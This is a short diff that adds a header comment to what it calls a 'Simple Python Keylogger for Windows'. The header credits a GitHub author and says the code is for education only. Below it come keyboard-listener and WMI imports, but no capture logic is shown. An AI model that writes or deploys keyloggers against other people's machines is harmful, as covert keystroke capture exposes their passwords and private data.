@@ -1,4 +1,13 @@
 
+# ==============================================================================
+# Simple Python Keylogger for Windows
+# Created by: ThunderZ
+# Github Link: https://github.com/ThunderZ-Coder-A
+# ==============================================================================
+'''
+NOTE: Feel free to copy, modify, reuse the source for education purposes only.
+'''
+
 from pynput.keyboard import Key, Listener
 import logging
 import wmi
